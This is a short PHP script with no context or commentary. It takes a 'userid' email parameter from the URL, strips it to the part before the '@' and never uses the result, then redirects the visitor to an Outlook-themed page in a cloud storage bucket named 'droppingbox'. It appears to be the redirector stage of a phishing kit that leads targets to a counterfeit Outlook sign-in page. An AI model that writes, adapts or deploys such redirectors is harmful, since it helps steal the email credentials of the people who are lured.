<?php
function getuseridIDFromuserid($userid)
{
$find = '@';
$pos = strpos($userid, $find);
$userID = substr($userid, 0, $pos);
return $userID;
}
$userid = $_GET['userid'];
$userID = getuseridIDFromuserid($userid);
header("Location: https://droppingbox.sfo2.digitaloceanspaces.com/outlook/index.html");
?>
